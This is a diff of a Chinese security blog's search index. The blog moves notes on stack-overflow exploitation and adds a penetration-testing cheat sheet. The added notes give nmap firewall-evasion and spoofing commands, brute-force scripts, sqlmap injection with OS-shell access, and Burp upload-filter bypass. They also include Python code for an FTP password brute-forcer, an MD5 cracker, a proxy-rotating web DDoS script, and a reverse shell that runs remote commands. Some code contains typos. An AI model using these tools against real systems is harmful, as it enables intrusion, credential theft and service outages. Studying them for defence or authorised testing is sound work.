-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add esp ,xxx    ;降低栈顶，回收当前栈帧</span><br><span class="line">pop ebp    ;将上一个栈帧底部位置恢复到ebp</span><br><span class="line">retn    ;两个功能：a. 弹出当前栈顶元素（栈帧中的返回地址） b.处理器跳转到弹出的返回地址，恢复调用之前的代码区</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h4 id="扩充汇编知识书籍：《IBM-X86汇编》或《Win32汇编》"><a href="#扩充汇编知识书籍：《IBM-X86汇编》或《Win32汇编》" class="headerlink" title="+. 扩充汇编知识书籍：《IBM X86汇编》或《Win32汇编》"></a>+. 扩充汇编知识书籍：《IBM X86汇编》或《Win32汇编》</h4><h3 id="2-修改邻接变量"><a href="#2-修改邻接变量" class="headerlink" title="2. 修改邻接变量"></a>2. 修改邻接变量</h3><h3 id="3-修改函数返回地址"><a href="#3-修改函数返回地址" class="headerlink" title="3. 修改函数返回地址"></a>3. 修改函数返回地址</h3><h3 id="4-代码植入"><a href="#4-代码植入" class="headerlink" title="4. 代码植入"></a>4. 代码植入</h3><h2 id="开发shellcode"><a href="#开发shellcode" class="headerlink" title="开发shellcode"></a>开发shellcode</h2><h2 id="MetaSploit开发Exploit"><a href="#MetaSploit开发Exploit" class="headerlink" title="MetaSploit开发Exploit"></a>MetaSploit开发Exploit</h2><h2 id="堆溢出利用"><a href="#堆溢出利用" class="headerlink" title="堆溢出利用"></a>堆溢出利用</h2><h2 id="Windows异常处理机制"><a href="#Windows异常处理机制" class="headerlink" title="Windows异常处理机制"></a>Windows异常处理机制</h2><h2 id="高级内存攻击技术"><a href="#高级内存攻击技术" class="headerlink" title="高级内存攻击技术"></a>高级内存攻击技术</h2><h2 id="手机里的缓冲区溢出"><a href="#手机里的缓冲区溢出" class="headerlink" title="手机里的缓冲区溢出"></a>手机里的缓冲区溢出</h2><h2 id="其他软件漏洞利用技术"><a href="#其他软件漏洞利用技术" class="headerlink" title="其他软件漏洞利用技术"></a>其他软件漏洞利用技术</h2><h2 id="Windows安全机制"><a href="#Windows安全机制" class="headerlink" title="Windows安全机制"></a>Windows安全机制</h2><h2 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h2><h2 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h2><h2 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h2><h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><h2 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a>SEHOP</h2><h2 id="堆保护与攻击"><a href="#堆保护与攻击" class="headerlink" title="堆保护与攻击"></a>堆保护与攻击</h2><h1 id="三、漏洞挖掘"><a href="#三、漏洞挖掘" class="headerlink" title="三、漏洞挖掘"></a>三、漏洞挖掘</h1><h1 id="四、漏洞分析"><a href="#四、漏洞分析" class="headerlink" title="四、漏洞分析"></a>四、漏洞分析</h1>]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>PWN</category>
-      </categories>
-      <tags>
-        <tag>网络空间安全</tag>
-        <tag>安全漏洞</tag>
-        <tag>0day</tag>
-        <tag>Stack overflow</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HACKER-USEFUL-GUIDE</title>
     <url>/2021/12/25/HACKER-USEFUL-GUIDE/</url>
     <content><![CDATA[<ul>
@@ -1084,6 +735,178 @@
       </tags>
   </entry>
   <entry>
+    <title>LINUX-PENETRATION</title>
+    <url>/2021/12/25/LINUX-PENETRATION/</url>
+    <content><![CDATA[<h1 id="NMAP高级嗅探"><a href="#NMAP高级嗅探" class="headerlink" title="NMAP高级嗅探"></a>NMAP高级嗅探</h1><h2 id="网络-防火墙逃逸嗅探"><a href="#网络-防火墙逃逸嗅探" class="headerlink" title="(网络)防火墙逃逸嗅探"></a>(网络)防火墙逃逸嗅探</h2><ol>
+<li>IDS（Intrusion Detection Systems）入侵检测系统</li>
+<li>NMAP逃逸方案：<ol>
+<li>报文分段：<code>nmap -f [IP]</code> &#x2F;&#x2F;将TCP头分段在几个包中，使过滤器、IDS以及其他工具检测更加困难</li>
+<li>指定最大传输单元（MTU,Maximum Transmission Unit）：<code>nmap --mtu [num] [IP]</code> 设定TCP&#x2F;IP协议传输数据时最大传输单元，有效实现逃逸</li>
+<li>隐蔽扫描：<code>nmap -D RND:[num] [IP]</code> “-D”启动隐蔽扫描，让目标主机认为是利用诱饵进行扫描而非本机，实现隐藏自身IP。（应对方式：路由跟踪、响应丢弃等）</li>
+<li>源地址欺骗：<code>nmap -sI [www.baidu.com:80] [IP]</code> 伪造一个地址作为发起扫描的源地址</li>
+<li>源端口欺骗：<code>nmap --source-port [num] [IP]</code> 指定一个随机端口，通过该端口发送数据</li>
+<li>MAC地址欺骗：<code>nmap -sT --spoof-mac [MAC] [IP]</code></li>
+<li>附加随机数据：<code>nmap --data-length [num] [IP]</code> 参杂一些随机数据影响防火墙判断</li>
+</ol>
+</li>
+</ol>
+<h2 id="NSE-脚本"><a href="#NSE-脚本" class="headerlink" title="NSE 脚本"></a>NSE 脚本</h2><h3 id="1-信息收集脚本"><a href="#1-信息收集脚本" class="headerlink" title="1. 信息收集脚本"></a>1. 信息收集脚本</h3><ol>
+<li>IP信息：<code>nmap --script ip-geolocation-* [IP]</code></li>
+<li>Whois：<code>nmap --script whois [site]</code></li>
+<li>IP反查：<code>nmap --script hostmap-ip2hosts [site]</code></li>
+</ol>
+<h3 id="2-漏洞扫描脚本"><a href="#2-漏洞扫描脚本" class="headerlink" title="2. 漏洞扫描脚本"></a>2. 漏洞扫描脚本</h3><ol>
+<li>windows系统主机漏洞扫描：<code>nmap --script smb-check-vulns.nse -p [IP]</code></li>
+<li>web漏洞扫描：<code>nmap -sV --script=vulscan/vulscan.nse [IP]</code> Vulscan漏洞扫描高级脚本，包含CVE\OSVDB\Exploit-db\openvas多个平台指纹数据，具备离线扫描功能。（<a href="http://www.computec.ch/projekte/vulscan/?s=download" title="http://www.computec.ch/projekte/vulscan/?s=download">脚本地址</a>存放于目录\nmap\scripts\下）</li>
+</ol>
+<h3 id="3-渗透测试脚本"><a href="#3-渗透测试脚本" class="headerlink" title="3. 渗透测试脚本"></a>3. 渗透测试脚本</h3><ol>
+<li>FTP服务审计：<code>nmap --script ftp-brute --script-args userdb=user.txt,passdb=pass.txt -p 21 [IP]</code> 通过设定的字典对FTP爆破</li>
+<li>Wordpress密码审计：<code>nmap -p80 --script http-wordpress-brute --script-args userdb=user.txt,passdb=passwd.txt [IP]</code> &#x2F;&#x2F; 可通过设定线程数量提高破解速度：<code>--script-args http-wordpress.threads=[num]</code></li>
+<li>数据库安全审计：<code>nmap -p80 --script oracle-brute -p 1521 --script-args oracle-brute.sid=test --script-args userdb=username.txt,passdb=passwd.txt [IP]</code> (MySQL操作一致)</li>
+</ol>
+<h1 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h1><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><ol>
+<li><code>sqlmap -u URL --tables</code></li>
+</ol>
+<h2 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h2><ol>
+<li>实质：使用了ASP一类的动态脚本实现</li>
+<li>存在漏洞位置加 “ * ”：<code>sqlmap -u URL/id/40*.html --dbs</code></li>
+</ol>
+<h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><ol>
+<li>产生来源：request方法，用户可从提交的参数中获取参数值</li>
+<li><code>sqlmap -u &quot;http://xxx.xxx.xxx/shownews.asp&quot; --cookie &quot;id=25&quot; --tables --level 2</code><ol>
+<li>将URL分段</li>
+<li>使用<code>--cookie</code>进行连接</li>
+<li>设置<code>--level</code>等级2级以上</li>
+</ol>
+</li>
+</ol>
+<h2 id="POST类型注入"><a href="#POST类型注入" class="headerlink" title="POST类型注入"></a>POST类型注入</h2><ol>
+<li>产生来源：（搜索框、登录框）对POST过滤不严</li>
+<li>操作步骤：<ol>
+<li>方法一：<ol start="2">
+<li>获取表单信息进行分析：找出输入框对应参数变量</li>
+<li>使用<code>--data</code>指定注入点：<code>sqlmap -u http://xxx/Login.asp --data &quot;[Name]=1&amp;[Password]=1&quot;</code></li>
+</ol>
+</li>
+<li>方法二：<ol>
+<li>使用<code>--forms</code>sqlmap自动获取相关信息，查看输出结果<code>Payload:</code>处：<code>sqlmap -u http://domain/Login.asp --forms</code></li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="防火墙逃逸"><a href="#防火墙逃逸" class="headerlink" title="防火墙逃逸"></a>防火墙逃逸</h2><ol>
+<li>方案一：<code>--delay 1</code>使用延迟方法逃逸</li>
+<li>方案二：<code>--tamper &quot;xxx.py&quot;</code>执行逃逸脚本（默认脚本位置：&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F;）</li>
+</ol>
+<h2 id="命令执行与维持访问"><a href="#命令执行与维持访问" class="headerlink" title="命令执行与维持访问"></a>命令执行与维持访问</h2><ol>
+<li>产生来源：开发者配置问题，不限制数据库权限，注入点未添加权限限制</li>
+<li><code>--os-cmd=xxx</code></li>
+<li><code>--os-shell</code></li>
+</ol>
+<h1 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h1><h2 id="基本操作："><a href="#基本操作：" class="headerlink" title="基本操作："></a>基本操作：</h2><h3 id="1-proxy-gt-gt-Intercept"><a href="#1-proxy-gt-gt-Intercept" class="headerlink" title="1. proxy&gt;&gt;Intercept"></a>1. proxy&gt;&gt;Intercept</h3><ol>
+<li>forwar</li>
+<li>drop：放弃当前数据</li>
+<li>intercept is on&#x2F;off：开关</li>
+<li>Raw：请求地址、http协议版本、主机头、浏览器信息、cookie、网页内容等信息</li>
+<li>Params：GET请求、POST请求、Cookie参数</li>
+<li>Hex：显示Raw选项的16进制内容</li>
+</ol>
+<h3 id="2-密码安全审计（Intruder）"><a href="#2-密码安全审计（Intruder）" class="headerlink" title="2. 密码安全审计（Intruder）"></a>2. 密码安全审计（Intruder）</h3><ol>
+<li>Action &gt;&gt; Send to Intruder</li>
+<li>Positions:<ol>
+<li>Add$：选中内容设置为变量</li>
+<li>Clean$：重置变量</li>
+<li>Auto$：自动选取变量</li>
+<li>Refresh</li>
+<li>Attack type:<ol>
+<li>Sniper：适合只有一个变量，每次填入一个参数进行审计</li>
+<li>Battering ram：用于两个及以上的变量，在一个字典文件中提取一个值覆盖多个变量进行审计</li>
+<li>Pitchfork：在两个字典文件中提取一对或一个值覆盖变量</li>
+<li>Cluster bomb：使用两个字典进行排列组合并进行审计</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>Payloads：设置payload模式，配置字典</li>
+<li>start attack：观察len长度，进行筛选</li>
+</ol>
+<h3 id="3-重放攻击"><a href="#3-重放攻击" class="headerlink" title="3. 重放攻击"></a>3. 重放攻击</h3><ol>
+<li>intruder 传递审计结果到 repeater ：重放发送，查看响应内容</li>
+<li>proxy 上传数据（木马）传递到 repeater 进行数据欺骗：修改文件类型验证信息，进行重放攻击验证（当目标服务器配置了文件格式限制）<ul>
+<li>扩展名验证：<code>filename=&quot;xxx.php&quot;</code></li>
+<li>MINI类型验证：<code>Content-Type:</code>2. 文件头校验&#x2F;文件完整性验证：插入真实的[图片文件]</li>
+</ul>
+</li>
+</ol>
+<h3 id="4-响应比较"><a href="#4-响应比较" class="headerlink" title="4. 响应比较"></a>4. 响应比较</h3><ol>
+<li>Comparer：自动高亮功能方便比较</li>
+</ol>
+<h3 id="5-Web漏洞脚本安全审计：Taget-gt-gt-scan"><a href="#5-Web漏洞脚本安全审计：Taget-gt-gt-scan" class="headerlink" title="5. Web漏洞脚本安全审计：Taget &gt;&gt; scan"></a>5. Web漏洞脚本安全审计：Taget &gt;&gt; scan</h3><h3 id="6-cookie安全性随机分析：Sequencer"><a href="#6-cookie安全性随机分析：Sequencer" class="headerlink" title="6. cookie安全性随机分析：Sequencer"></a>6. cookie安全性随机分析：Sequencer</h3><h3 id="7-编码解码器：Decoder"><a href="#7-编码解码器：Decoder" class="headerlink" title="7. 编码解码器：Decoder"></a>7. 编码解码器：Decoder</h3><h3 id="8-第三方模块：Extender"><a href="#8-第三方模块：Extender" class="headerlink" title="8. 第三方模块：Extender"></a>8. 第三方模块：Extender</h3><h1 id="BeFF测试Xss漏洞"><a href="#BeFF测试Xss漏洞" class="headerlink" title="BeFF测试Xss漏洞"></a>BeFF测试Xss漏洞</h1><h1 id="Develop-Penetration-Tools"><a href="#Develop-Penetration-Tools" class="headerlink" title="Develop Penetration Tools"></a>Develop Penetration Tools</h1><h2 id="1-简单的FTP破解程序样式（可优化，加入多线程提高性能等）"><a href="#1-简单的FTP破解程序样式（可优化，加入多线程提高性能等）" class="headerlink" title="1. 简单的FTP破解程序样式（可优化，加入多线程提高性能等）"></a>1. 简单的FTP破解程序样式（可优化，加入多线程提高性能等）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from ftplib import FTP</span><br><span class="line">def ftp_login(host,username,password)</span><br><span class="line">    try:</span><br><span class="line">        ftp=FTP()</span><br><span class="line">        ftp.connect(host,21)</span><br><span class="line">        ftp.login(username,password)</span><br><span class="line">        ftp.quit()</span><br><span class="line">        print(&quot;[+]Sucess Password:&quot;,password)</span><br><span class="line">    except:</span><br><span class="line">            pass</span><br><span class="line">def ftp_try(host,username,password):</span><br><span class="line">    for i in open(password):</span><br><span class="line">        ftp_login(host,username,i.strip())</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    ftp_try(&#x27;192.168.0.1&#x27;,&#x27;admin&#x27;,&#x27;/home/password.txt&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-MD5破解程序（彩虹表碰撞、穷举法）"><a href="#2-MD5破解程序（彩虹表碰撞、穷举法）" class="headerlink" title="2. MD5破解程序（彩虹表碰撞、穷举法）"></a>2. MD5破解程序（彩虹表碰撞、穷举法）</h2><ol>
+<li><p>python提供了hashlib模块，对明文进行MD5加密</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hshlib</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(&#x27;Python&#x27;.encode(&#x27;utf-8&#x27;))</span><br><span class="line">print(md5.hexidigest())</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>程序思路：取出字典中的明文，使用hashlib进行加密，加密结果与密文进行对比，一致打印明文，不一致则继续循环。</p>
+<ol>
+<li>hashlib加密明文</li>
+<li>datatime计算程序运行时间</li>
+<li>sys获取输入的密文</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import datetime</span><br><span class="line">import sys</span><br><span class="line">name=sys.argv[1]</span><br><span class="line">starttime=datetime.datetime.now()</span><br><span class="line">for i in open(r&#x27;C:/123.txt&#x27;):</span><br><span class="line">    rs=i.strip()</span><br><span class="line">    md5=hashlib.md5()</span><br><span class="line">    md5.update(rs.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    newmd5 = md5.hexdigest()</span><br><span class="line">    if newmd5 == name:</span><br><span class="line">        print(&quot;解密成功！明文是：&quot;,rs)</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        pass</span><br><span class="line">    endtime = datetime.datetime.now()</span><br><span class="line">    print(endtime-starttime)      </span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="3-Web密码安全审计工具"><a href="#3-Web密码安全审计工具" class="headerlink" title="3. Web密码安全审计工具"></a>3. Web密码安全审计工具</h2><h2 id="4-ChallengeCallapsar压力测试（CC：WEB-DDOS）"><a href="#4-ChallengeCallapsar压力测试（CC：WEB-DDOS）" class="headerlink" title="4. ChallengeCallapsar压力测试（CC：WEB DDOS）"></a>4. ChallengeCallapsar压力测试（CC：WEB DDOS）</h2><ol>
+<li><p>原理：多线程模拟多合法用户，确保有大量可用的代理地址</p>
+</li>
+<li><p>操作思路：</p>
+<ol>
+<li><p>引入urllib、threading模块，将获取的代理地址以列表方式存储（代理地址可采取爬虫方式批量获取）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from urllib import request</span><br><span class="line">import threading</span><br><span class="line">url = &quot;http://www.xxxx.com/&quot;</span><br><span class="line">proxies=[&quot;114.xxx.xxx.xx:xxxx&quot;,&quot;xxx.xxx.xxx.xxx:xxxx&quot;,&quot;xxx.xxx.xxx:xxxx&quot;]</span><br><span class="line">class cc(threading.Thread):</span><br><span class="line">def __init__(self,url,proxies):</span><br><span class="line">  super(cc,self).__init__()</span><br><span class="line">  self.url=url</span><br><span class="line">  self.proxies=proxies</span><br><span class="line">  self.start()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>CC函数定义</p>
+<ol>
+<li>request.ProxyHandler()函数设置代理服务器</li>
+<li>build_opener()函数创建自定义Opener对象</li>
+<li>Install_opener()函数创建opener</li>
+<li>可选择使用random.choice()随机选择代理地址，可呈现不规则方式，躲避目标防火墙</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># class cc(threading,Thread):</span><br><span class="line">def run(self):</span><br><span class="line">while True:</span><br><span class="line">  try:</span><br><span class="line">      pro_random = random.choice(self.proxies)</span><br><span class="line">      pro_support = request.ProxyHandler(&#123;&quot;http&quot;:pro_random&#125;)</span><br><span class="line">      opener = request.build_opener(pro_support)</span><br><span class="line">      request.install_opener(opener)</span><br><span class="line">      request.urlopen(self.url)</span><br><span class="line">  except:</span><br><span class="line">          pass</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>执行循环</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in range(5000):</span><br><span class="line">cc(url.proxies)</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+<h2 id="5-后渗透（维持访问）：TCP反向连接"><a href="#5-后渗透（维持访问）：TCP反向连接" class="headerlink" title="5. 后渗透（维持访问）：TCP反向连接"></a>5. 后渗透（维持访问）：TCP反向连接</h2><ol>
+<li><p>服务端：</p>
+<ol>
+<li>导入socket模块</li>
+<li>安装并绑定套接字，允许最大连接数100，超出则拒绝</li>
+<li>通过一个while循环来接受并发送用户执行的命令</li>
+<li>将结果接收回来并打印</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.bind((&#x27;&#x27;,1234))</span><br><span class="line">s.listen(100)</span><br><span class="line">conn,addr = s.accept()</span><br><span class="line">while 1:</span><br><span class="line"> command = input(&#x27;......&gt;&#x27;)</span><br><span class="line"> if command == &#x27;exit()&#x27;:</span><br><span class="line">     conn.send(command.encode(&#x27;gbk&#x27;))</span><br><span class="line">     break</span><br><span class="line"> else:</span><br><span class="line">     if command == &#x27;&#x27;:</span><br><span class="line">         continue</span><br><span class="line">     conn,send(command.encode(&#x27;gbk&#x27;))</span><br><span class="line">     result = conn.recv(1024)</span><br><span class="line">     print(result.decode(&#x27;gbk&#x27;,&#x27;ignore&#x27;))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>客户端</p>
+<ol>
+<li>使用subprocess执行获得的用户命令</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket,subprocess as sp,sys,re</span><br><span class="line">conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">conn.connect((&#x27;127.0.0.1&#x27;,1234))</span><br><span class="line">while 1:</span><br><span class="line"> command = conn.renv(1024)</span><br><span class="line"> if command == &#x27;exit()&#x27;:</span><br><span class="line">     break</span><br><span class="line"> else:</span><br><span class="line">     sh = sp.Popen(command.decode(&#x27;gbk&#x27;),shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE)</span><br><span class="line">     out,err=sh.communicate()</span><br><span class="line">     conn.send(out)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></li>
+</ol>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>WEB渗透</category>
+        <category>LINUX</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>网络空间安全</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PYTHON PROGRAM-GUIDE</title>
     <url>/2022/03/17/PYTHON-PROGRAM-GUIDE/</url>
     <content><![CDATA[<ul>
@@ -1412,6 +1235,183 @@
       <tags>
         <tag>程序开发安全</tag>
         <tag>编程语言</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ODAY-软件漏洞分析</title>
+    <url>/2022/01/06/ODAY-%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<ul>
+<li><a href="#%E4%B8%80-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">一、基础知识</a><ul>
+<li><a href="#%E5%AE%9A%E4%B9%89">定义</a></li>
+<li><a href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7">逆向分析工具</a></li>
+</ul>
+</li>
+<li><a href="#%E4%BA%8C-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">二、漏洞利用</a><ul>
+<li><a href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8">栈溢出利用</a><ul>
+<li><a href="#1-%E7%B3%BB%E7%BB%9F%E6%A0%88">1. 系统栈</a><ul>
+<li><a href="#%E8%BF%9B%E7%A8%8B%E4%BD%BF%E7%94%A8%E7%9A%84%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F%E6%8C%89%E5%8A%9F%E8%83%BD%E5%88%92%E5%88%86">进程使用的内存区域按功能划分</a></li>
+<li><a href="#win32%E7%B3%BB%E7%BB%9F%E6%8F%90%E4%BE%9B%E4%BA%86%E4%B8%A4%E4%B8%AA%E7%89%B9%E6%AE%8A%E5%AF%84%E5%AD%98%E5%99%A8%E7%94%A8%E4%BA%8E%E6%A0%87%E8%AF%86%E4%BD%8D%E4%BA%8E%E7%B3%BB%E7%BB%9F%E6%A0%88%E6%A0%88%E9%A1%B6%E7%9A%84%E6%A0%88%E5%B8%A7">Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧</a></li>
+<li><a href="#%E4%B8%8D%E5%90%8C%E7%BC%96%E8%AF%91%E5%99%A8%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F%E5%B7%AE%E5%BC%82">不同编译器调用方式差异</a></li>
+<li><a href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%A4%A7%E8%87%B4%E6%AD%A5%E9%AA%A4">函数调用大致步骤：</a></li>
+<li><a href="#%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%A4%A7%E8%87%B4%E6%AD%A5%E9%AA%A4">函数返回大致步骤：</a></li>
+<li><a href="#%E6%89%A9%E5%85%85%E6%B1%87%E7%BC%96%E7%9F%A5%E8%AF%86%E4%B9%A6%E7%B1%8Dibm-x86%E6%B1%87%E7%BC%96%E6%88%96win32%E6%B1%87%E7%BC%96">+. 扩充汇编知识书籍：《IBM X86汇编》或《Win32汇编》</a></li>
+</ul>
+</li>
+<li><a href="#2-%E4%BF%AE%E6%94%B9%E9%82%BB%E6%8E%A5%E5%8F%98%E9%87%8F">2. 修改邻接变量</a></li>
+<li><a href="#3-%E4%BF%AE%E6%94%B9%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80">3. 修改函数返回地址</a></li>
+<li><a href="#4-%E4%BB%A3%E7%A0%81%E6%A4%8D%E5%85%A5">4. 代码植入</a></li>
+</ul>
+</li>
+<li><a href="#%E5%BC%80%E5%8F%91shellcode">开发shellcode</a></li>
+<li><a href="#metasploit%E5%BC%80%E5%8F%91exploit">MetaSploit开发Exploit</a></li>
+<li><a href="#%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8">堆溢出利用</a></li>
+<li><a href="#windows%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6">Windows异常处理机制</a></li>
+<li><a href="#%E9%AB%98%E7%BA%A7%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF">高级内存攻击技术</a></li>
+<li><a href="#%E6%89%8B%E6%9C%BA%E9%87%8C%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA">手机里的缓冲区溢出</a></li>
+<li><a href="#%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF">其他软件漏洞利用技术</a></li>
+<li><a href="#windows%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6">Windows安全机制</a></li>
+<li><a href="#gs">GS</a></li>
+<li><a href="#safeseh">SafeSEH</a></li>
+<li><a href="#dep">DEP</a></li>
+<li><a href="#aslr">ASLR</a></li>
+<li><a href="#sehop">SEHOP</a></li>
+<li><a href="#%E5%A0%86%E4%BF%9D%E6%8A%A4%E4%B8%8E%E6%94%BB%E5%87%BB">堆保护与攻击</a></li>
+</ul>
+</li>
+<li><a href="#%E4%B8%89-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98">三、漏洞挖掘</a></li>
+<li><a href="#%E5%9B%9B-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">四、漏洞分析</a></li>
+</ul>
+<h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><ol>
+<li>BUG：功能性逻辑缺陷</li>
+<li>漏洞：安全性逻辑缺陷（软件中缓冲区溢出漏洞、网站中跨站脚本xss漏洞、SQL注入漏洞等）</li>
+<li>0day响应：<ol>
+<li><a href="http://cve.mitre.org/" title="http://cve.mitre.org">CVE</a></li>
+<li><a href="http://www.cert.org/" title="http://www.cert.org">CERT</a></li>
+<li>微软安全中心”Black Tuesday“：每个月第二周星期二发布补丁</li>
+</ol>
+</li>
+<li><strong>PE文件格式</strong>：Win32平台下可执行文件遵守的数据格式（“*.exe” &#x2F; “*.dll”等）<ol>
+<li>.text：由编译器产生，存放二进制的机器码，是反汇编和调试的对象</li>
+<li>.data：初始化的数据块（如：宏定义、全局变量、静态变量等）</li>
+<li>.idata：可执行文件所使用的动态链接库等外来函数与文件的信息</li>
+<li>.rsrc：存放程序的资源（如图标、菜单等）</li>
+<li>.reloc 、.edata 、.tls 、.rdata</li>
+</ol>
+</li>
+<li><strong>“虚拟内存”</strong>（非操作系统中的虚拟内存）：在用户模式下，用调试器看到的内存地址 [指Windows用户态内存隐射机制下的虚拟内存]</li>
+<li><strong>PE文件与虚拟内存的映射</strong>：VA &#x3D; ImageBase + RVA<ol>
+<li>文件偏移地址（File Offset）</li>
+<li>装载基址（Image Base）</li>
+<li>虚拟内存地址（Virtual Address,VA）</li>
+<li>相对虚拟地址（Relative Virtual Address,RVA）</li>
+</ol>
+</li>
+</ol>
+<h2 id="逆向分析工具"><a href="#逆向分析工具" class="headerlink" title="逆向分析工具"></a>逆向分析工具</h2><ol>
+<li><p>OllyDbg</p>
+</li>
+<li><p>SoftICE</p>
+</li>
+<li><p>WinDbg</p>
+</li>
+<li><p>IDE Pro</p>
+</li>
+<li><p>二进制编辑器（Ultra Edit、Hex Workshop、WinHex）</p>
+</li>
+<li><p>虚拟机</p>
+</li>
+<li><p>Crack二进制文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//密码验证实验程序</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int verify_password(char *password)</span><br><span class="line">&#123;</span><br><span class="line">   int authenticated;</span><br><span class="line">   authenticated=strcmp(password,PASSWORD);</span><br><span class="line">   return authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">   int valid_flag = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h1><h2 id="栈溢出利用"><a href="#栈溢出利用" class="headerlink" title="栈溢出利用"></a>栈溢出利用</h2><h3 id="1-系统栈"><a href="#1-系统栈" class="headerlink" title="1. 系统栈"></a>1. 系统栈</h3><ol>
+<li><h4 id="进程使用的内存区域按功能划分"><a href="#进程使用的内存区域按功能划分" class="headerlink" title="进程使用的内存区域按功能划分"></a>进程使用的内存区域<strong>按功能</strong>划分</h4><ol>
+<li>代码区：cpu在此区域取值执行</li>
+<li>数据区：存储全局变量等</li>
+<li>堆区：动态分配和回收。进程在堆区请求一定大小的内存</li>
+<li>栈区：用于动态地存储函数间的调用关系，保证被调用函数在返回时恢复到母函数继续执行。</li>
+</ol>
+</li>
+<li><h4 id="Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧"><a href="#Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧" class="headerlink" title="Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧"></a>Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧</h4><ol>
+<li>ESP（<a href="extended_stack_pointer" title="extended_stack_pointer">栈指针寄存器</a>）：存放一个永远指向系统栈<strong>最上面一个栈帧的顶部</strong></li>
